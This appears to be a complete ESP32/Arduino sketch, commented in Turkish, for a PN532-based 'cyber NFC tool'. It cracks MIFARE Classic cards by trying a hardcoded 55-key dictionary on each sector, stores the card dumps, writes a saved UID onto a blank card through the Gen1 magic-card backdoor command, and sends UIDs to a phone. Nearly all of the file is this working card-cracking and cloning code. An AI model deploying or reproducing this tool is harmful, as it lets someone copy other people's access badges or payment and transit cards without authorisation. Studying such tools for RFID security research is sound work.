#include <Arduino.h>
#include <SPIFFS.h>
#include <PN532_HSU.h>
#include <PN532.h>
// SNEP ve NDEF kütüphanelerini ekliyoruz
#include <snep.h>
#include <NdefMessage.h>

// --- BAĞLANTILAR ---
// Elechouse V3 PN532 -> ESP32
// TX  -> GPIO 16 (RX2)
// RX  -> GPIO 17 (TX2)
// DIP SWITCH: OFF - OFF

PN532_HSU pn532_hsu(Serial2);
PN532 nfc(pn532_hsu);
// SNEP nesnesini nfc üzerinden başlatıyoruz
SNEP snep(pn532_hsu);

// --- BELLEK YAPISI ---
struct CardProfile {
  byte uid[7];
  byte uidLen;
  byte data[1024]; 
  byte sectorKeys[16][6]; 
  bool sectorSolved[16];  
};

CardProfile activeCard;

// --- NDEF TAMPONU (Emülasyon İçin) ---
uint8_t ndefBuf[128];

// --- GENİŞLETİLMİŞ SÖZLÜK (GLOBAL) ---
const int TOTAL_KEYS = 55; 
const byte keys[TOTAL_KEYS][6] = {
  // ... (Senin anahtar listen aynı kalıyor) ...
  {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, 
  {0x00,0x00,0x00,0x00,0x00,0x00}, 
  {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5}, 
  {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}, 
  {0xB0,0xB1,0xB2,0xB3,0xB4,0xB5},
  {0x4D,0x3A,0x99,0xC3,0x51,0xDD},
  {0x1A,0x98,0x2C,0x7E,0x45,0x9A},
  {0xAA,0xBB,0xCC,0xDD,0xEE,0xFF},
  {0x71,0x4C,0x5C,0x88,0x6E,0x97},
  {0x58,0x7E,0xE5,0xF9,0x35,0x0F},
  {0xA0,0x47,0x8C,0xC3,0x90,0x91},
  {0xA0,0xB0,0xC0,0xD0,0xE0,0xF0},
  {0xA1,0xB1,0xC1,0xD1,0xE1,0xF1},
  {0xFF,0xFF,0xFF,0xFF,0xFF,0x00}, 
  {0x00,0x00,0x00,0x00,0x00,0xFF}, 
  {0xAB,0xCD,0xEF,0x12,0x34,0x56},
  {0x12,0x34,0x56,0xAB,0xCD,0xEF},
  {0x12,0x34,0x56,0x78,0x9A,0xBC},
  {0x01,0x02,0x03,0x04,0x05,0x06},
  {0x10,0x20,0x30,0x40,0x50,0x60},
  {0x00,0x01,0x02,0x03,0x04,0x05},
  {0x12,0x12,0x12,0x12,0x12,0x12},
  {0xF0,0xF0,0xF0,0xF0,0xF0,0xF0},
  {0x0F,0x0F,0x0F,0x0F,0x0F,0x0F},
  {0x53,0x3C,0xB6,0xC7,0x23,0xF6},
  {0x8F,0xD0,0xA4,0xF2,0x56,0xE9},
  {0x11,0x11,0x11,0x11,0x11,0x11},
  {0x22,0x22,0x22,0x22,0x22,0x22},
  {0x33,0x33,0x33,0x33,0x33,0x33},
  {0x44,0x44,0x44,0x44,0x44,0x44},
  {0x55,0x55,0x55,0x55,0x55,0x55},
  {0x66,0x66,0x66,0x66,0x66,0x66},
  {0x77,0x77,0x77,0x77,0x77,0x77},
  {0x88,0x88,0x88,0x88,0x88,0x88},
  {0x99,0x99,0x99,0x99,0x99,0x99},
  {0x14,0x53,0x14,0x53,0x14,0x53},
  {0x19,0x23,0x19,0x23,0x19,0x23},
  {0x34,0x34,0x34,0x34,0x34,0x34},
  {0x06,0x06,0x06,0x06,0x06,0x06},
  {0x35,0x35,0x35,0x35,0x35,0x35},
  {0x01,0x01,0x01,0x01,0x01,0x01},
  {0x63,0x63,0x63,0x63,0x63,0x63},
  {0x12,0x34,0x56,0x12,0x34,0x56},
  {0x12,0x31,0x23,0x12,0x31,0x23},
  {0x20,0x23,0x20,0x23,0x20,0x23},
  {0x20,0x24,0x20,0x24,0x20,0x24},
  {0x20,0x25,0x20,0x25,0x20,0x25},
  {0x11,0x22,0x33,0x44,0x55,0x66},
  {0xAA,0xAA,0xAA,0xBB,0xBB,0xBB},
  {0xAD,0xAD,0xAD,0xAD,0xAD,0xAD},
  {0x12,0x34,0x56,0x65,0x43,0x21},
  {0x00,0x00,0x00,0xFF,0xFF,0xFF}
};

// Fonksiyonlar
void smartAnalyzeAndSave();    // [R]
int findCardInDB(byte* uid, byte len);
void displayDataWithASCII(int sector, int block, byte* data);
bool tryKey(byte* uid, byte len, int sector, const byte* key); 
void verifyAndWrite();    // [W]
void emulateActiveCard(); // [E] -> ARTIK SNEP KULLANACAK
void deleteCard(int index);
void listCards();
void loadCardFromDisk(int index);
bool unlockBackdoor();
void reselectCard(byte* expectedUID, byte len); 

void setup() {
  // İstediğin gibi 9600 baud
  Serial.begin(9600);
  
  // KRİTİK: Buffer artırımı (SNEP stabilitesi için)
  Serial2.setRxBufferSize(1024);
  
  delay(1000);
  Serial.println("\n--- TURKISH CYBER NFC TOOL V10.0 (FINAL) ---");
  Serial.println("Modes: [R] Read/Crack | [W] Clone | [E] Send UID to Phone");

  if (!SPIFFS.begin(true)) Serial.println("SPIFFS Hatasi!");

  nfc.begin();
  if (!nfc.getFirmwareVersion()) { Serial.println("PN532 BULUNAMADI!"); while(1); }
  
  // Başlangıç yapılandırması
  nfc.SAMConfig();
}

void loop() {
  if (Serial.available() > 0) {
    String str = Serial.readStringUntil('\n');
    str.trim(); str.toUpperCase();
    if (str.length() == 0) return;
    
    char cmd = str.charAt(0);
    int idx = str.length() > 1 ? str.substring(1).toInt() : -1;

    if (cmd == 'R') smartAnalyzeAndSave();
    else if (cmd == 'L') listCards();
    else if (cmd == 'W') { if(idx>=0){ loadCardFromDisk(idx); verifyAndWrite(); } else Serial.println("Orn: W0"); }
    else if (cmd == 'E') { if(idx>=0){ loadCardFromDisk(idx); emulateActiveCard(); } else Serial.println("Orn: E0"); }
    else if (cmd == 'D') { if(idx>=0) deleteCard(idx); }
  }
}

void reselectCard(byte* expectedUID, byte len) {
  byte uid[7]; byte l;
  nfc.inListPassiveTarget(); // Reset ve bekleme
  nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &l, 50);
}

// --- [R] AKILLI ANALİZ ALGORİTMASI (DOKUNULMADI) ---
void smartAnalyzeAndSave() {
  Serial.println("\n=== [R] AKILLI KIRMA MODU (TR) ===");
  Serial.println("Karti koyun ve bekleyin...");

  byte uid[7]; byte len;
  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 500)) { delay(50); }

  Serial.print("Kart Algilandi! UID: ");
  for(int i=0; i<len; i++) { Serial.print(uid[i], HEX); Serial.print(" "); }
  Serial.println();

  // HAZIRLIK
  memset(&activeCard, 0, sizeof(CardProfile));
  memcpy(activeCard.uid, uid, len);
  activeCard.uidLen = len;

  Serial.println("--- ANALIZ BASLIYOR (Re-Select Aktif) ---");
  byte goldenKey[6] = {0}; 
  bool hasGoldenKey = false;

  // --- ADIM 1: SEKTÖR 0 ---
  Serial.print("Sektor 0 Kiriliyor... ");
  for (int k = 0; k < TOTAL_KEYS; k++) {
    if (k > 0) reselectCard(uid, len);
    if (tryKey(uid, len, 0, keys[k])) {
      Serial.println("[ BASARILI ]");
      memcpy(goldenKey, keys[k], 6);
      memcpy(activeCard.sectorKeys[0], keys[k], 6);
      activeCard.sectorSolved[0] = true;
      hasGoldenKey = true;
      for (int b=0; b<4; b++) nfc.mifareclassic_ReadDataBlock(b, &activeCard.data[b*16]);
      break; 
    }
  }

  if (!hasGoldenKey) Serial.println("[ BASARISIZ ]");

  // --- ADIM 2: DİĞER SEKTÖRLER ---
  Serial.println("\nDiger sektorler taraniyor (Detayli Mod)...");
  
  for (int s = 1; s < 16; s++) {
    Serial.print("Sektor "); Serial.print(s); Serial.print(": ");
    bool cracked = false;
    
    // Strateji A: Golden Key
    if (hasGoldenKey) {
      reselectCard(uid, len);
      if (tryKey(uid, len, s, goldenKey)) {
        memcpy(activeCard.sectorKeys[s], goldenKey, 6);
        activeCard.sectorSolved[s] = true;
        cracked = true;
      }
    }

    // Strateji B: Sözlük (VERBOSE MOD)
    if (!cracked) {
      Serial.print("[Deneme: ");
      for (int k = 0; k < TOTAL_KEYS; k++) {
        // Canlı Gösterge
        Serial.print(k); Serial.print("..");
        yield(); 

        reselectCard(uid, len);
        if (tryKey(uid, len, s, keys[k])) {
          memcpy(activeCard.sectorKeys[s], keys[k], 6);
          activeCard.sectorSolved[s] = true;
          cracked = true;
          Serial.print(" BULUNDU!]");
          break; 
        }
        
        if (k > 0 && k % 10 == 9) Serial.print("\n          ");
      }
      if (!cracked) Serial.print(" YOK]");
    }
    
    if (cracked) {
      Serial.println(" -> OK");
      reselectCard(uid, len);
      tryKey(uid, len, s, activeCard.sectorKeys[s]);
      for (int b = 0; b < 4; b++) {
        int blk = (s*4)+b;
        nfc.mifareclassic_ReadDataBlock(blk, &activeCard.data[blk*16]);
      }
    } else {
      Serial.println(" -> FAIL");
    }
  }

  // KAYDETME
  int newID = 0;
  while(SPIFFS.exists("/card_"+String(newID)+".bin")) newID++;
  File f = SPIFFS.open("/card_" + String(newID) + ".bin", "w");
  f.write((byte*)&activeCard, sizeof(CardProfile));
  f.close();
  Serial.print("\n>>> KAYIT TAMAMLANDI. ID: "); Serial.println(newID);
}

// --- YARDIMCI FONKSİYONLAR ---
bool tryKey(byte* uid, byte len, int sector, const byte* key) {
  if(nfc.mifareclassic_AuthenticateBlock(uid, len, sector * 4, 0, (uint8_t*)key)) return true;
  reselectCard(uid, len); 
  if(nfc.mifareclassic_AuthenticateBlock(uid, len, sector * 4, 1, (uint8_t*)key)) return true;
  return false;
}

void displayDataWithASCII(int sector, int block, byte* data) {}

int findCardInDB(byte* uid, byte len) { return -1; }

void deleteCard(int index) { SPIFFS.remove("/card_"+String(index)+".bin"); Serial.println("Silindi."); }

void listCards() {
  Serial.println("\n--- VERITABANI ---");
  int i=0;
  while(i<100) {
    if(SPIFFS.exists("/card_"+String(i)+".bin")) {
      Serial.print("ID [ "); Serial.print(i); Serial.println(" ] - Kayitli");
    }
    i++;
  }
}

void loadCardFromDisk(int index) {
  String n = "/card_" + String(index) + ".bin";
  if(!SPIFFS.exists(n)) { Serial.println("Gecersiz ID"); return; }
  File f = SPIFFS.open(n, "r");
  f.read((byte*)&activeCard, sizeof(CardProfile));
  f.close();
  Serial.println("Yuklendi. Klonlanacak/Gonderilecek UID: ");
  for(int i=0; i<activeCard.uidLen; i++) { Serial.print(activeCard.uid[i], HEX); Serial.print(" "); }
  Serial.println();
}

// --- [W] DOĞRULAMALI YAZMA FONKSİYONU (DOKUNULMADI) ---
void verifyAndWrite() {
  Serial.println("\n=== [W] KLONLAMA (DOGRULAMALI) ===");
  Serial.println("Lutfen HEDEF (Bos) karti koyun...");
  
  byte targetUID[7]; byte targetLen;
  while (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, targetUID, &targetLen, 500)) { delay(50); }

  Serial.print("Hedef Kart UID: ");
  for(int i=0; i<targetLen; i++) { Serial.print(targetUID[i], HEX); Serial.print(" "); }
  Serial.println();

  Serial.println("Analiz: Sifre cozuluyor...");
  uint8_t targetKey[6];
  bool unlocked = false;
  int unlockedKeyType = 0; 
  bool isGen1 = false;

  for (int k = 0; k < TOTAL_KEYS; k++) {
    if (k > 0) reselectCard(targetUID, targetLen);

    if (nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 0, (uint8_t*)keys[k])) {
      Serial.println(" -> Kilit Acildi (Key A).");
      memcpy(targetKey, keys[k], 6); unlocked = true; unlockedKeyType = 0; break;
    }
    reselectCard(targetUID, targetLen); 
    if (nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 1, (uint8_t*)keys[k])) {
      Serial.println(" -> Kilit Acildi (Key B).");
      memcpy(targetKey, keys[k], 6); unlocked = true; unlockedKeyType = 1; break;
    }
  }

  if (!unlocked) {
    reselectCard(targetUID, targetLen);
    if (unlockBackdoor()) { Serial.println(" -> BACKDOOR (Gen 1) Acildi."); unlocked = true; isGen1 = true; }
  }

  if (!unlocked) { Serial.println("HATA: Hedef kart acilmadi."); return; }

  byte block0Buffer[16] = {0};
  
  if (!isGen1) {
    reselectCard(targetUID, targetLen);
    nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, unlockedKeyType, targetKey);
    nfc.mifareclassic_ReadDataBlock(0, block0Buffer);
  }

  memcpy(block0Buffer, activeCard.uid, 4); 

  byte bcc = 0;
  for(int i=0; i<4; i++) bcc ^= activeCard.uid[i];
  block0Buffer[4] = bcc;
  
  Serial.println("Yazilacak Blok 0 (UID + BCC): ");
  for(int i=0; i<16; i++) { Serial.print(block0Buffer[i], HEX); Serial.print(" "); }
  Serial.println();

  Serial.println("Yazma Komutu Gonderiliyor...");
  bool cmdSent = false;

  if (isGen1) {
    if (nfc.mifareclassic_WriteDataBlock(0, block0Buffer)) cmdSent = true;
  } else {
    reselectCard(targetUID, targetLen);
    if (nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, unlockedKeyType, targetKey)) {
      if (nfc.mifareclassic_WriteDataBlock(0, block0Buffer)) cmdSent = true;
    }
  }

  if (!cmdSent) {
    Serial.println("HATA: Yazma komutu kabul edilmedi.");
    return;
  }

  Serial.println("Dogrulaniyor (Fiziksel Okuma)...");
  
  nfc.SAMConfig(); 
  delay(100);
  
  byte verifyUID[7]; byte verifyLen;
  bool readSuccess = false;
  
  for(int i=0; i<3; i++) {
     if(nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, verifyUID, &verifyLen, 200)) {
       readSuccess = true;
       break;
     }
     delay(50);
  }

  if (!readSuccess) {
    Serial.println("HATA: Kart yazildiktan sonra okunamadi (Brick olmus olabilir veya uzaklastirildi).");
    return;
  }

  Serial.print("Okunan Yeni UID: ");
  for(int i=0; i<verifyLen; i++) { Serial.print(verifyUID[i], HEX); Serial.print(" "); }
  Serial.println();

  if (memcmp(verifyUID, activeCard.uid, 4) == 0) {
    Serial.println("\n>>> TEBRIKLER! FIZIKSEL YAZMA BASARILI. <<<");
    Serial.println("Kartiniz klonlandi.");
  } else {
    Serial.println("\n>>> BAŞARISIZ! <<<");
    Serial.println("Komut gitti ama kart UID'yi degistirmedi.");
  }
}

// --- [E] YENİ SNEP EMÜLASYON FONKSİYONU ---
void emulateActiveCard() {
  Serial.println("\n=== [E] EMULASYON (UID GONDER) ===");
  Serial.println("Telefonu yaklastirin (Ekran acik olsun)...");
  Serial.println("Cikmak icin tusa basin.");

  // 1. UID String'ini Hazırla
  String uidStr = "UID: ";
  for (int i = 0; i < activeCard.uidLen; i++) {
      if(activeCard.uid[i] < 0x10) uidStr += "0";
      uidStr += String(activeCard.uid[i], HEX);
      if(i < activeCard.uidLen - 1) uidStr += " "; 
  }
  uidStr.toUpperCase();
  Serial.print("Gonderilecek Mesaj: "); Serial.println(uidStr);

  // 2. NDEF TEXT RECORD OLUŞTURMA (Manuel)
  int textLen = uidStr.length();
  int payloadLen = 3 + textLen; // 1 byte Status + 2 byte Lang + Text
  int totalLen = 7 + textLen;   // Header(2) + PayloadLen(1) + Type(1) + Payload

  ndefBuf[0] = 0xD1; // Header (MB/ME/SR/TNF=Well Known)
  ndefBuf[1] = 0x01; // Type Length (1 byte)
  ndefBuf[2] = payloadLen; // Payload Length
  ndefBuf[3] = 'T';  // Type = 'T' (Text)
  
  ndefBuf[4] = 0x02; // Status (UTF-8)
  ndefBuf[5] = 'e';  // Language 'en'
  ndefBuf[6] = 'n';
  
  for(int i=0; i<textLen; i++) {
      ndefBuf[7+i] = uidStr.charAt(i);
  }

  // 3. GÖNDERİM DÖNGÜSÜ
  unsigned long startTime = millis();
  bool sent = false;

  while(millis() - startTime < 30000) { // 30 Saniye Timeout
      
      // SNEP üzerinden yaz
      if (snep.write(ndefBuf, totalLen) > 0) {
          Serial.println("\n>>> BASARILI! UID TELEFONA GONDERILDI! <<<");
          sent = true;
          delay(2000); 
          break; 
      } else {
          delay(100); 
      }

      if(Serial.available()) break; 
  }
  
  if(!sent) Serial.println("\nZaman asimi veya iptal.");
  
  // İşlem bitince okuyucuyu resetle ki [R] modu çalışsın
  nfc.begin();
  nfc.SAMConfig();
}

bool unlockBackdoor() {
  byte u[]={0x43}; byte r[32]; uint8_t l=32;
  return (nfc.inDataExchange(u,1,r,&l) && l>0 && r[0]==0x0A);
}